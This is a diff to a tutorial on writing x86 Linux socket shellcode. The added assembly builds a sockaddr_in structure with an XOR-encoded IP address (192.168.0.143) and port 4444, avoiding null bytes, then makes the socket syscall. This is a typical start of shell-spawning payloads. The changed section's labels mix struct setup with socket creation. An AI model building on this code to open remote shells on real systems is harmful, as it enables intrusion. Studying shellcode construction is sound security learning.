@@ -184,26 +184,37 @@ The last argument value for int protocol is going to be ‘0’ to accept any pr
 
 ```nasm
         ; push socket values onto the stack
-        push esi        ; push 0 onto the stack, default protocol
-        push 0x1        ; push 1 onto the stack, SOCK_STREAM
-        push 0x2        ; push 2 onto the stack, AF_INET
+        push esi         ; push 0 onto the stack, default protocol
+        push 0x1         ; push 1 onto the stack, SOCK_STREAM
+        push 0x2         ; push 2 onto the stack, AF_INET
 ```
 
 The newly created socket can be identified by storing the value of EAX into the EDX register as reference for a later stage (with the ability to use EAX in subsequent system calls):
 
 ```nasm
-	mov edx, eax   ; save the return value
+	mov edx, eax   	 ; save the return value
 ```
 
 1st Syscall (Assembly code section):
 
 ```nasm
-        ; 1st syscall - create socket
-        mov al, 0x66    ; hex value for socket
-        mov bl, 0x1     ; socket
-        mov ecx, esp    ; pointer to the arguments pushed
-        int 0x80        ; call the interrupt to create the socket, execute the syscall
-        mov edx, eax    ; save the return value
+        ; 1st syscall - create socket (sockaddr_in struct)
+	push eax
+	push eax 	 ; 8 bytes of padding
+	mov eax, 0xffffffff ; XOR IP address with this hex value (avoid NULL's contained in IP)
+	mov ebx, 0x70ff573f ; hex value of 192.168.0.143 XOR'd with 0xffffffff
+	xor ebx, eax
+	push ebx         ; IP address 192.168.0.143 is set
+	push word 0x5c11 ; port 4444 is set
+	push word 0x02   ; AF_INET
+	; call socket(domain, type, protocol)
+	xor eax, eax
+	xor ebx, ebx
+	mov ax, 0x167    ; hex value of 359
+	mov bl, 0x02     ; AF_INET
+	mov cl, 0x01     ; SOCK_STREAM
+	int 0x80	 ; call the interrupt to create the socket, execute the syscall		
+	mov ebx, eax     ; socket file descriptor
 ```
 
 #### 2nd Syscall (Bind Socket to IP/Port in Sockaddr Struct)
